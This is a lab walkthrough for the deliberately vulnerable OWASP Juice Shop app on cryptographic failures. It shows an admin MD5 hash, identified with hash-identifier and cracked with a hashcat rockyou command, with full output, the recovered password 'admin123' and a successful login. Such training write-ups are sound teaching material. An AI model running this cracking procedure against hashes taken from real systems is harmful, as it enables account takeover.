# A2:2021 - Cryptographic Failures

## Overview
[Cryptographic Failures](https://owasp.org/Top10/A02_2021-Cryptographic_Failures/) occur when applications fail to properly protect data in transit and at rest through inadequate or missing cryptographic controls. This vulnerability category encompasses issues such as using weak encryption algorithms, improper key management, transmitting sensitive data in plaintext, and failing to encrypt sensitive data altogether.

Cryptographic failures can lead to exposure of sensitive data including personal information, authentication credentials, financial data, and other confidential information. These failures often result from using outdated cryptographic standards, poor implementation of encryption, or complete absence of encryption where it should be applied.

## Reconnaissance
This vulnerability as discovered during the [injection](./03-injection.md) of the walk through. Do that one first. 

The aforementioned injection attack revealed user information with some sort of hashed/encrypted passwords. Let's figure out what the scheme could be and see if its breakable. 

```json
{"id":1,"name":"admin@juice-sh.op","description":"","price":4,"deluxePrice":"0192023a7bbd73250516f069df18b500","image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},```

Kali has a handy tool called Hash Identifier. Paste in any hash and it will try to figure out what it is. 

```sh
$ hash-identifier
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: 0192023a7bbd73250516f069df18b500

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
```

Hash Identifer shoes to this to be an MD5 hash, which has cryptographic flaws and tools like Hashcat have wordlists to break it. If this isn't a very copmlex password, Hashcar will break it. 

## Exploit
Runing Hashcat with the Rockyou wordlist to try and break the admin user's password.

I saved the hash to a file called `admin.txt` on my `cwd` and ran the builtin Rockyou wordlist from Kali.


```sh
hashcat -m 0 -a 0 admin.txt /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu--0x000, 1436/2937 MB (512 MB allocatable), 6MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 0 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

0192023a7bbd73250516f069df18b500:admin123                 
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 0192023a7bbd73250516f069df18b500
Time.Started.....: Tue Jun 10 07:26:35 2025 (0 secs)
Time.Estimated...: Tue Jun 10 07:26:35 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   874.9 kH/s (0.08ms) @ Accel:256 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 90624/14344385 (0.63%)
Rejected.........: 0/90624 (0.00%)
Restore.Point....: 89088/14344385 (0.62%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: hairy -> 141201

Started: Tue Jun 10 07:26:21 2025
Stopped: Tue Jun 10 07:26:37 2025
```

Hashcat was able to find the password in its wordlist of `admin123`. Let's try it on the site. 

We're in!

Chaining multiple exploits can bring an even greater impact to a business than standalone.

